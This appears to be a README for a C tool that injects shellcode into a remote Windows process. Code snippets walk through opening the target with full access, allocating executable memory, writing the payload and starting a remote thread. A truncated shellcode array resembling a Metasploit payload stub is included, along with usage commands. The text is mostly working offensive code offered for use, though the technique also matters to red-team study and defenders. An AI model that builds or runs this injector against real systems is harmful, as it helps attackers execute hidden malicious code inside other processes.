# Remote Process Injection
## Overview
This tool is designed to inject shellcode into a remote process running on a Windows system. It takes the Process ID (PID) of the target process as a command-line argument, allocates memory in the target process, writes the shellcode to the allocated memory, and creates a remote thread to execute the shellcode.

## Usage
```
remoteprocessinjection.exe <PID>

```
<PID> The Process ID of the target process where the shellcode will be injected.

## Prerequisites
.Administrator privileges on the system.
.The tool must be executed on a Windows operating system.
.The target process must be accessible and should allow PROCESS_ALL_ACCESS.
## Key Components

### Shellcode
The my_shellcode array contains the machine code to be executed in the target process. This is where the user should place their custom shellcode.
```c
char my_shellcode[] = {
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    // ... (rest of the shellcode)
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5"
};
```

### Opening the Target Process
The OpenProcess function is used to obtain a handle to the target process using the specified PID.

``` c
hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
```

### Allocating Memory in the Target Process
Memory is allocated in the target process using VirtualAllocEx.

```c
execution_memory = VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

### Writing Shellcode to the Allocated Memory
The shellcode is written into the allocated memory space using WriteProcessMemory

``` c
if (!WriteProcessMemory(hProcess, execution_memory, my_shellcode, length, NULL)) {
    // Error handling
}
```
### Creating a Remote Thread
A remote thread is created to execute the shellcode in the target process using CreateRemoteThread.

``` c
hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)execution_memory, NULL, 0, 0);
```

## Error Handling
The tool checks for errors at each step (opening the process, allocating memory, writing to memory, creating a thread) and prints appropriate error messages with error codes using GetLastError.

## Example
To inject shellcode into a process with PID 1234:

``` cmd
remoteprocessinjection.exe 1234
```
